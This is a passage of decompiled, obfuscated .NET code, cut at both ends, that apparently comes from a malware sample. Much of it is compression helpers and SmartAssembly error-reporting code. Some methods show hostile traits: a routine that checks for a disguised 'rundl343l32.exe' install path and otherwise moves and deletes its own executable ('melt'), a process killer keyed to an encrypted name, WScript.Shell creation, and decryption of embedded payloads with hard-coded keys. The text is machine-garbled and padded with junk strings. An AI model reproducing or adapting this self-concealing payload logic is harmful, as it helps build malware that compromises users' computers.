		if (class41_0.int_2 <= 0)
		{
			goto IL_0009;
		}
		goto IL_003b;
		IL_003b:
		class41_0.byte_0[class41_0.int_1++] = (byte)class41_0.uint_0;
		if (class41_0.int_2 <= 8)
		{
			goto IL_0009;
		}
		goto IL_0063;
		IL_0009:
		while (true)
		{
			class41_0.uint_0 = 0u;
			if (eBBp0Op7wSDKHwLe0VT())
			{
				switch (5)
				{
				case 4:
					goto IL_003b;
				case 1:
				case 3:
					goto end_IL_0009;
				case 5:
					class41_0.int_2 = 0;
					return;
				}
				continue;
			}
			break;
			continue;
			end_IL_0009:
			break;
		}
		goto IL_0063;
		IL_0063:
		class41_0.byte_0[class41_0.int_1++] = (byte)(class41_0.uint_0 >> 8);
		goto IL_0009;
	}

	static void smethod_138(Class31.Class40 class40_0)
	{
		if (class40_0.int_4 >= 65274)
		{
			if (!eBBp0Op7wSDKHwLe0VT())
			{
				goto IL_00df;
			}
			switch (4)
			{
			case 0:
			case 4:
				break;
			case 3:
			case 5:
				goto IL_005b;
			case 2:
				goto IL_0090;
			default:
				goto IL_00df;
			case 6:
				goto IL_00fb;
			}
			Class56.smethod_14(class40_0);
		}
		goto IL_004b;
		IL_009e:
		int num = default(int);
		Array.Copy(class40_0.byte_1, class40_0.int_7, class40_0.byte_0, class40_0.int_4 + class40_0.int_5, num);
		class40_0.int_7 += num;
		class40_0.int_6 += num;
		goto IL_00df;
		IL_00df:
		class40_0.int_5 += num;
		goto IL_004b;
		IL_00f2:
		if (class40_0.int_5 < 3)
		{
			return;
		}
		goto IL_00fb;
		IL_004b:
		if (class40_0.int_5 < 262)
		{
			goto IL_005b;
		}
		goto IL_00f2;
		IL_005b:
		if (class40_0.int_7 < class40_0.int_8)
		{
			num = 65536 - class40_0.int_5 - class40_0.int_4;
			if (num > class40_0.int_8 - class40_0.int_7)
			{
				goto IL_0090;
			}
			goto IL_009e;
		}
		goto IL_00f2;
		IL_00fb:
		Class56.smethod_29(class40_0);
		return;
		IL_0090:
		num = class40_0.int_8 - class40_0.int_7;
		goto IL_009e;
	}

	static void smethod_139(Class44 class44_0, Enum4 enum4_0, string string_0, string string_1)
	{
		Delegate20 delegate20_ = default(Delegate20);
		if (eBBp0Op7wSDKHwLe0VT())
		{
			switch (4)
			{
			case 4:
				delegate20_ = class44_0.delegate20_0;
				goto case 1;
			case 1:
			case 3:
				if (delegate20_ == null)
				{
					return;
				}
				break;
			case 5:
				return;
			}
		}
		delegate20_(class44_0, new EventArgs3(enum4_0, string_0, string_1));
	}

	static int smethod_140(Class31.Class38 class38_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static bool smethod_141(bool bool_0, Class31.Class40 class40_0, bool bool_1)
	{
		bool flag;
		do
		{
			Class56.smethod_138(class40_0);
			bool bool_2 = bool_0 && class40_0.int_7 == class40_0.int_8;
			flag = Class56.smethod_158(bool_1, bool_2, class40_0);
		}
		while (class40_0.class41_0.IsFlushed && flag);
		return flag;
	}

	static void smethod_142(short[] short_0, byte[] byte_0, Class31.Class38.Class39 class39_0)
	{
		class39_0.short_1 = short_0;
		class39_0.byte_0 = byte_0;
	}

	static void smethod_143(IWebProxy iwebProxy_0, Class57 class57_0)
	{
		class57_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_144(int int_0, Class31.Class41 class41_0)
	{
		class41_0.byte_0[class41_0.int_1++] = (byte)int_0;
		class41_0.byte_0[class41_0.int_1++] = (byte)(int_0 >> 8);
	}

	static byte[] smethod_145(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class56.smethod_119(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class31.Stream0 stream = new Class31.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class56.smethod_42(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class56.smethod_64(stream);
			int num3 = Class56.smethod_64(stream);
			int num4 = Class56.smethod_64(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class56.smethod_42(stream);
			Class56.smethod_42(stream);
			Class56.smethod_42(stream);
			int num5 = Class56.smethod_42(stream);
			int num6 = Class56.smethod_64(stream);
			int num7 = Class56.smethod_64(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class31.Class32 class32_ = new Class31.Class32(array2);
			array = new byte[num5];
			Class56.smethod_152(0, array.Length, array, class32_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class56.smethod_42(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class56.smethod_42(stream);
					num11 = Class56.smethod_42(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class31.Class32 class32_2 = new Class31.Class32(array3);
					Class56.smethod_152(i, num11, array, class32_2);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 249, 88, 86, 131, 246, 206, 210, 198 };
				byte[] byte_2 = new byte[8] { 31, 165, 38, 148, 222, 141, 38, 222 };
				using ICryptoTransform cryptoTransform = Class56.smethod_99(byte_2, bool_0: true, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class56.smethod_145(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class56.smethod_167(byte_5, bool_0: true, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class56.smethod_145(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_146()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 301:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_005f;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_008f;
						case 8:
						case 9:
							goto IL_0094;
						case 12:
							goto IL_00a0;
						case 13:
							goto IL_00a4;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a4:
					num = 13;
					File.Delete(text + "melt.txt");
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text = "" + Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0056;
					IL_0056:
					num = 4;
					executablePath = Application.get_ExecutablePath();
					goto IL_005f;
					IL_005f:
					num = 5;
					flag = false;
					goto IL_0064;
					IL_0064:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(executablePath, (object)(text + Class56.smethod_95("#thenwfol#") + "\\" + Class56.smethod_95("#rundl343l32.exe#")), false))
					{
						goto IL_008f;
					}
					goto IL_0094;
					IL_008f:
					num = 7;
					flag = true;
					goto IL_0094;
					IL_0094:
					num = 9;
					if (flag)
					{
						goto end_IL_0000_3;
					}
					goto IL_00a0;
					IL_00a0:
					num = 12;
					goto IL_00a4;
					end_IL_0000_2:
					break;
				}
				num = 14;
				File.Move(Application.get_ExecutablePath(), text + "melt.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 301;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_147(Exception exception_0, object[] object_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == "{report}")
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class56.smethod_46(exception_0, object_0);
			}
			Class54.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	static bool smethod_148(Class31.Class32 class32_0)
	{
		int num = Class56.smethod_52(class32_0.class34_0);
		int int_ = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num2;
			if (num >= 258)
			{
				int_ = class32_0.int_4;
				num2 = 9;
				if (!eBBp0Op7wSDKHwLe0VT())
				{
					goto IL_0025;
				}
			}
			else
			{
				num2 = 12;
				if (!eBBp0Op7wSDKHwLe0VT())
				{
					goto IL_00e1;
				}
			}
			goto IL_0088;
			IL_01a6:
			if (num3 < 0)
			{
				break;
			}
			Class56.smethod_71(class32_0.class33_0, class32_0.int_5);
			class32_0.int_7 += num3;
			goto IL_01ce;
			IL_0147:
			class32_0.int_4 = 9;
			goto IL_014f;
			IL_0088:
			switch (num2)
			{
			case 9:
				break;
			case 2:
			case 5:
				goto IL_0077;
			case 1:
				goto IL_00c3;
			default:
				goto IL_00e1;
			case 0:
			case 6:
				goto IL_00fc;
			case 10:
				goto IL_0138;
			case 11:
				goto IL_01a6;
			case 8:
				goto IL_01e5;
			case 7:
				continue;
			case 4:
				goto IL_023a;
			case 12:
				return true;
			}
			goto IL_0025;
			IL_0077:
			if (--num < 258)
			{
				return true;
			}
			goto IL_0042;
			IL_014f:
			num4 = Class56.smethod_61(class32_0.class35_1, class32_0.class33_0);
			if (num4 >= 0)
			{
				class32_0.int_7 = Class31.Class32.int_2[num4];
				class32_0.int_5 = Class31.Class32.int_3[num4];
				goto IL_0182;
			}
			return false;
			IL_0025:
			switch (int_)
			{
			case 7:
				break;
			case 8:
				goto IL_00fc;
			case 9:
				goto IL_014f;
			case 10:
				goto IL_0182;
			default:
				continue;
			}
			goto IL_0042;
			IL_0042:
			if (((uint)(num4 = Class56.smethod_61(class32_0.class35_0, class32_0.class33_0)) & 0xFFFFFF00u) != 0)
			{
				goto IL_00c3;
			}
			Class56.smethod_2(class32_0.class34_0, num4);
			num2 = 5;
			if (eBBp0Op7wSDKHwLe0VT())
			{
				goto IL_0088;
			}
			goto IL_01a6;
			IL_023a:
			return true;
			IL_00c3:
			if (num4 >= 257)
			{
				class32_0.int_6 = Class31.Class32.int_0[num4 - 257];
				goto IL_00e1;
			}
			if (num4 < 0)
			{
				return false;
			}
			class32_0.class35_1 = null;
			class32_0.class35_0 = null;
			class32_0.int_4 = 2;
			goto IL_023a;
			IL_0182:
			if (class32_0.int_5 > 0)
			{
				class32_0.int_4 = 10;
				num3 = Class56.smethod_48(class32_0.class33_0, class32_0.int_5);
				goto IL_01a6;
			}
			goto IL_01ce;
			IL_00e1:
			class32_0.int_5 = Class31.Class32.int_1[num4 - 257];
			goto IL_00fc;
			IL_00fc:
			if (class32_0.int_5 > 0)
			{
				class32_0.int_4 = 8;
				num5 = Class56.smethod_48(class32_0.class33_0, class32_0.int_5);
				if (num5 >= 0)
				{
					Class56.smethod_71(class32_0.class33_0, class32_0.int_5);
					goto IL_0138;
				}
				return false;
			}
			goto IL_0147;
			IL_01ce:
			Class56.smethod_73(class32_0.class34_0, class32_0.int_6, class32_0.int_7);
			goto IL_01e5;
			IL_01e5:
			num -= class32_0.int_6;
			class32_0.int_4 = 7;
			continue;
			IL_0138:
			class32_0.int_6 += num5;
			goto IL_0147;
		}
		return false;
	}

	static void smethod_149(Class31.Class35 class35_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int num = 2;
		if (!eBBp0Op7wSDKHwLe0VT())
		{
			goto IL_01c6;
		}
		int num3 = default(int);
		int num2 = default(int);
		int[] array2 = default(int[]);
		int num8 = default(int);
		int num9 = default(int);
		int num7 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int i = default(int);
		int num4 = default(int);
		int num11 = default(int);
		while (true)
		{
			switch (num)
			{
			case 8:
				if (num3 > 0)
				{
					array[num3]++;
				}
				num2++;
				goto IL_0020;
			case 5:
				num2 = 0;
				goto IL_0020;
			case 2:
				array2 = new int[16];
				goto case 5;
			case 4:
				num8 = 0;
				num9 = 512;
				num7 = 1;
				goto IL_00c0;
			case 12:
			{
				int num12 = array2[num7] & 0x1FF80;
				int num13 = num8 & 0x1FF80;
				num9 += num13 - num12 >> 16 - num7;
				goto IL_00e5;
			}
			case 0:
				num5 = 512;
				num6 = 15;
				goto IL_0131;
			default:
				for (; i < num4; i += 128)
				{
					class35_0.short_0[Class56.smethod_155(i)] = (short)((-num5 << 4) | num6);
					num5 += 1 << num6 - 9;
				}
				num6--;
				goto IL_0131;
			case 6:
			case 7:
				break;
			case 3:
				goto IL_01c6;
			case 10:
				goto IL_01cb;
			case 13:
				goto IL_0207;
			case 9:
			case 11:
				goto IL_023e;
			case 14:
				goto IL_0244;
				IL_00e5:
				num7++;
				goto IL_00c0;
				IL_0020:
				if (num2 < byte_0.Length)
				{
					num3 = byte_0[num2];
					num = 8;
					if (eBBp0Op7wSDKHwLe0VT())
					{
						continue;
					}
					goto case 8;
				}
				goto case 4;
				IL_00c0:
				if (num7 <= 15)
				{
					array2[num7] = num8;
					num8 += array[num7] << 16 - num7;
					if (num7 < 10)
					{
						goto IL_00e5;
					}
					goto case 12;
				}
				class35_0.short_0 = new short[num9];
				goto case 0;
				IL_0131:
				if (num6 >= 10)
				{
					num4 = num8 & 0x1FF80;
					num8 -= array[num6] << 16 - num6;
					int num10 = num8 & 0x1FF80;
					i = num10;
					goto default;
				}
				num11 = 0;
				goto IL_0244;
			}
			break;
		}
		goto IL_01be;
		IL_01cb:
		int num14 = default(int);
		int num15 = default(int);
		do
		{
			class35_0.short_0[num14] = (short)((num11 << 4) | num15);
			num14 += 1 << num15;
		}
		while (num14 < 512);
		goto IL_022e;
		IL_022e:
		array2[num15] = num8 + (1 << 16 - num15);
		goto IL_023e;
		IL_0244:
		if (num11 < byte_0.Length)
		{
			num15 = byte_0[num11];
			if (num15 != 0)
			{
				num8 = array2[num15];
				goto IL_01be;
			}
			goto IL_023e;
		}
		return;
		IL_01c6:
		if (num15 <= 9)
		{
			goto IL_01cb;
		}
		int num16 = class35_0.short_0[num14 & 0x1FF];
		int num17 = 1 << (num16 & 0xF);
		goto IL_0207;
		IL_01be:
		num14 = Class56.smethod_155(num8);
		goto IL_01c6;
		IL_0207:
		num16 = -(num16 >> 4);
		do
		{
			class35_0.short_0[num16 | (num14 >> 9)] = (short)((num11 << 4) | num15);
			num14 += 1 << num15;
		}
		while (num14 < num17);
		goto IL_022e;
		IL_023e:
		num11++;
		goto IL_0244;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_150(int int_0, Class31.Class41 class41_0, int int_1, byte[] byte_0)
	{
		Array.Copy(byte_0, int_0, class41_0.byte_0, class41_0.int_1, int_1);
		class41_0.int_1 += int_1;
	}

	static int smethod_151(string string_0, Class45 class45_0)
	{
		try
		{
			bool flag = class45_0.char_0[0] == '\u0001';
			bool flag2 = default(bool);
			int num2 = default(int);
			int num3 = default(int);
			char c = default(char);
			int num4 = default(int);
			while (string_0 != null && string_0.Length != 0)
			{
				int num = 2;
				if (!J5IwCwpfghTToLC3MgK())
				{
				}
				while (true)
				{
					switch (num)
					{
					case 2:
						if (flag && string_0.Length > 4)
						{
							goto end_IL_0093;
						}
						if (!flag)
						{
							goto case 1;
						}
						goto IL_004c;
					case 1:
						if (string_0[0] != '#')
						{
							goto end_IL_0093;
						}
						goto IL_004c;
					case 0:
					case 7:
						break;
					case 8:
						if (flag2)
						{
							num2--;
							goto case 3;
						}
						return -1;
					case 4:
						while (num3 < class45_0.char_0.Length)
						{
							if (class45_0.char_0[num3] == c)
							{
								goto IL_00db;
							}
							num3++;
						}
						goto case 8;
					default:
						flag2 = true;
						goto case 8;
					case 3:
					case 6:
						if (num2 >= 0 && (flag || num2 != 0))
						{
							c = string_0[num2];
							flag2 = false;
							num3 = 0;
							goto case 4;
						}
						goto case 9;
					case 9:
						{
							return num4;
						}
						IL_004c:
						num4 = 0;
						num2 = string_0.Length - 1;
						num = 6;
						if (eBBp0Op7wSDKHwLe0VT())
						{
							continue;
						}
						goto case 9;
						IL_00db:
						num4 = num4 * class45_0.char_0.Length + num3;
						goto default;
					}
					break;
				}
				continue;
				end_IL_0093:
				break;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static int smethod_152(int int_0, int int_1, byte[] byte_0, Class31.Class32 class32_0)
	{
		int num = 0;
		do
		{
			if (class32_0.int_4 != 11)
			{
				int num2 = Class56.smethod_67(byte_0, int_1, int_0, class32_0.class34_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class56.smethod_8(class32_0) || (Class56.smethod_131(class32_0.class34_0) > 0 && class32_0.int_4 != 11));
		return num;
	}

	static void smethod_153(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_154(int int_0, bool bool_0, Class31.Class38 class38_0, byte[] byte_0, int int_1)
	{
		Class56.smethod_12(class38_0.class41_0, bool_0 ? 1 : 0, 3);
		Class56.smethod_137(class38_0.class41_0);
		Class56.smethod_144(int_0, class38_0.class41_0);
		Class56.smethod_144(~int_0, class38_0.class41_0);
		Class56.smethod_150(int_1, class38_0.class41_0, int_0, byte_0);
		Class56.smethod_27(class38_0);
	}

	static short smethod_155(int int_0)
	{
		return (short)((Class31.Class38.byte_0[int_0 & 0xF] << 12) | (Class31.Class38.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class31.Class38.byte_0[(int_0 >> 8) & 0xF] << 4) | Class31.Class38.byte_0[int_0 >> 12]);
	}

	static void smethod_156()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("qJ1rx6zo0JWv6cXezCyOGQ== ");
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static string smethod_157(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			if (registryKey == null)
			{
				return string.Empty;
			}
			string result = (string)registryKey.GetValue(string_0, string.Empty);
			registryKey.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	static bool smethod_158(bool bool_0, bool bool_1, Class31.Class40 class40_0)
	{
		if (class40_0.int_5 < 262 && !bool_1)
		{
			return false;
		}
		Class31.Class38 class38_3;
		byte[] byte_;
		int int_5;
		do
		{
			if (class40_0.int_5 >= 262 || bool_1)
			{
				if (class40_0.int_5 != 0)
				{
					if (class40_0.int_4 >= 65274)
					{
						Class56.smethod_14(class40_0);
					}
					int int_ = class40_0.int_1;
					int int_2 = class40_0.int_2;
					if (class40_0.int_5 >= 3)
					{
						int num = Class56.smethod_69(class40_0);
						if (num != 0 && class40_0.int_4 - num <= 32506 && Class56.smethod_117(class40_0, num) && class40_0.int_2 <= 5 && class40_0.int_2 == 3 && class40_0.int_4 - class40_0.int_1 > 4096)
						{
							class40_0.int_2 = 2;
						}
					}
					if (int_2 >= 3 && class40_0.int_2 <= int_2)
					{
						Class31.Class38 class38_ = class40_0.class38_0;
						int int_3 = class40_0.int_4 - 1 - int_;
						Class56.smethod_10(int_2, class38_, int_3);
						int_2 -= 2;
						do
						{
							class40_0.int_4++;
							class40_0.int_5--;
							if (class40_0.int_5 >= 3)
							{
								Class56.smethod_69(class40_0);
							}
						}
						while (--int_2 > 0);
						class40_0.int_4++;
						class40_0.int_5--;
						class40_0.bool_0 = false;
						class40_0.int_2 = 2;
					}
					else
					{
						if (class40_0.bool_0)
						{
							Class31.Class38 class38_2 = class40_0.class38_0;
							int int_4 = class40_0.byte_0[class40_0.int_4 - 1] & 0xFF;
							Class56.smethod_100(int_4, class38_2);
						}
						class40_0.bool_0 = true;
						class40_0.int_4++;
						class40_0.int_5--;
					}
					continue;
				}
				if (class40_0.bool_0)
				{
					Class31.Class38 class38_2 = class40_0.class38_0;
					int int_4 = class40_0.byte_0[class40_0.int_4 - 1] & 0xFF;
					Class56.smethod_100(int_4, class38_2);
				}
				class40_0.bool_0 = false;
				class38_3 = class40_0.class38_0;
				byte_ = class40_0.byte_0;
				int_5 = class40_0.int_3;
				int int_6 = class40_0.int_4 - class40_0.int_3;
				Class56.smethod_55(int_5, bool_0, byte_, int_6, class38_3);
				class40_0.int_3 = class40_0.int_4;
				return false;
			}
			return true;
		}
		while (!Class56.smethod_59(class40_0.class38_0));
		int num2 = class40_0.int_4 - class40_0.int_3;
		if (class40_0.bool_0)
		{
			num2--;
		}
		bool flag = bool_0 && class40_0.int_5 == 0 && !class40_0.bool_0;
		class38_3 = class40_0.class38_0;
		byte_ = class40_0.byte_0;
		int_5 = class40_0.int_3;
		Class56.smethod_55(int_5, flag, byte_, num2, class38_3);
		class40_0.int_3 += num2;
		return !flag;
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_159(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class56.smethod_46(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static byte[] smethod_160(Class45 class45_0)
	{
		return class45_0.method_4();
	}

	static void smethod_161(Class31.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static bool smethod_162(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class45_0.method_7();
	}

	static void smethod_163(Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class54.string_0 == "1") || !Class54.Handler.method_2((SecurityException)exception_0))
		{
			Class54.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_164()
	{
		Process process = new Process();
		process.WaitForExit();
		if (!process.HasExited)
		{
			process.Kill();
		}
		string text = "3232dsd";
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WSfcfdfdsfdsfsffffffffffffffccript.Shell", ""));
		objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		string text2 = "3232dsd";
	}

	static byte[] smethod_165(byte[] byte_0, string string_0)
	{
		if (!J5IwCwpfghTToLC3MgK())
		{
			RijndaelManaged rijndaelManaged = default(RijndaelManaged);
			RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
			MemoryStream memoryStream = default(MemoryStream);
			CryptoStream cryptoStream = default(CryptoStream);
			switch (5)
			{
			case 5:
				if (string_0.StartsWith("{"))
				{
					break;
				}
				rijndaelManaged = null;
				goto case 2;
			case 1:
			case 3:
				break;
			case 2:
			case 4:
				rSACryptoServiceProvider = null;
				memoryStream = null;
				goto default;
			default:
				cryptoStream = null;
				goto case 6;
			case 6:
				try
				{
					rijndaelManaged = new RijndaelManaged();
					rSACryptoServiceProvider = new RSACryptoServiceProvider();
					rSACryptoServiceProvider.FromXmlString(string_0);
					rijndaelManaged.GenerateKey();
					rijndaelManaged.GenerateIV();
					byte[] array = new byte[48];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
					Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
					memoryStream = new MemoryStream();
					try
					{
						byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
						memoryStream.WriteByte(1);
						memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
						memoryStream.Write(array2, 0, array2.Length);
					}
					catch (CryptographicException)
					{
						try
						{
							byte[] array3 = new byte[16];
							byte[] array4 = new byte[16];
							Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
							Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
							byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
							byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
							byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
							memoryStream.WriteByte(2);
							memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
							memoryStream.Write(array5, 0, array5.Length);
							memoryStream.Write(array6, 0, array6.Length);
							memoryStream.Write(array7, 0, array7.Length);
						}
						catch (CryptographicException)
						{
							Class43.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
							return null;
						}
					}
					cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.FlushFinalBlock();
					return memoryStream.ToArray();
				}
				catch (Exception ex3)
				{
					Class43.string_0 = "ERR 2004: " + ex3.Message;
					return null;
				}
				finally
				{
					rijndaelManaged?.Clear();
					rSACryptoServiceProvider?.Clear();
					memoryStream?.Close();
					cryptoStream?.Close();
				}
			}
		}
		Class43.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
		return null;
	}

	static void smethod_166(Class45 class45_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class56.smethod_26(class45_0, tempFileName);
			string path = Class56.smethod_1();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class45_0.eventHandler_0 != null)
			{
				class45_0.eventHandler_0(class45_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class56.smethod_23(new EventArgs0(fatalException), class45_0);
		}
	}

	static ICryptoTransform smethod_167(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static void smethod_168(Class31.Class38.Class39 class39_0, Class31.Class38.Class39 class39_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class39_0.int_1)
		{
			int num3 = 1;
			int num4 = class39_0.byte_0[num2];
			while (true)
			{
				IL_005d:
				int num5;
				int num6;
				if (num4 != 0)
				{
					num5 = 6;
					num6 = 3;
					while (num != num4)
					{
						if (eBBp0Op7wSDKHwLe0VT())
						{
							switch (0)
							{
							case 8:
								goto IL_005d;
							case 3:
								goto IL_0063;
							case 2:
								goto IL_006a;
							case 0:
							case 5:
								class39_1.short_0[num4]++;
								num3 = 0;
								goto end_IL_0057;
							case 6:
								goto end_IL_0057;
							case 1:
							case 9:
								goto end_IL_005d;
							}
							continue;
						}
						goto IL_0063;
						continue;
						end_IL_0057:
						break;
					}
					goto IL_008b;
				}
				goto IL_0063;
				IL_006a:
				num6 = 3;
				goto IL_008b;
				IL_008b:
				num = num4;
				num2++;
				while (num2 < class39_0.int_1 && num == class39_0.byte_0[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					class39_1.short_0[num] += (short)num3;
				}
				else if (num != 0)
				{
					class39_1.short_0[16]++;
				}
				else if (num3 <= 10)
				{
					class39_1.short_0[17]++;
				}
				else
				{
					class39_1.short_0[18]++;
				}
				break;
				IL_0063:
				num5 = 138;
				goto IL_006a;
				continue;
				end_IL_005d:
				break;
			}
		}
	}

	static int smethod_169(Class31.Class34 class34_0, Class31.Class33 class33_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class34_0.int_1), class33_0.AvailableBytes);
